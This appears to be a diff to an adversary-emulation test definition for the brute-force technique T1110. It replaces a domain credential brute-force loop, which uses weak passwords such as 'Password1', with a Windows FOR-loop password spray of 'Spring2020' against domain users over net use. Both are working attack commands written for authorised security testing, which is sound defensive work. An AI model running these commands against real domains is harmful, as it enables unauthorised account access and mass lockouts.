@@ -3,35 +3,22 @@ attack_technique: T1110
 display_name: Brute Force Credential Access
 
 atomic_tests:
-- name: Brute Force Credentials
+- name: Domain Password Spray (Windows FOR Loop)
   auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
   description: |
-    Creates username and password files then attempts to brute force on remote host
+    This test will attempt to authenticate to a domain controller with the specified password ('Spring2020' by default) for 1/3 of the users in the domain.
+    Be careful to not lock out user accounts. Use 'net accounts /domain' to review the domain password policy.
+    This test sprays only 1/3 of the domain users to help you avoid a catastrophic lockout of all accounts on the domain.
   supported_platforms:
     - windows
   input_arguments:
-    input_file_users:
-      description: Path to a file containing a list of users that we will attempt to brute force
-      type: Path
-      default: DomainUsers.txt
-    input_file_passwords:
-      description: Path to a file containing a list of passwords we will attempt to brute force with
-      type: Path
-      default: passwords.txt
-    remote_host:
-      description: Hostname of the target system we will brute force upon 
+    password:
+      description: Password to attempt for each users
       type: String
-      default: \\COMPANYDC1\IPC$
-    domain:
-      description: Domain name of the target system we will brute force upon 
-      type: String
-      default: YOUR_COMPANY
+      default: Spring2020
+
   executor: 
     name: command_prompt
     elevation_required: false
     command: |
-      net user /domain > #{input_file_users}
-      echo "Password1" >> #{input_file_passwords}
-      echo "1q2w3e4r" >> #{input_file_passwords}
-      echo "Password!" >> #{input_file_passwords}
-      @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
+      @FOR /F "skip=6" %n in ('net users /domain') do @net use %logonserver%\IPC$ /user:%userdomain%\%n #{password} 1>NUL 2>&1 & @echo|set/p=.  && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL
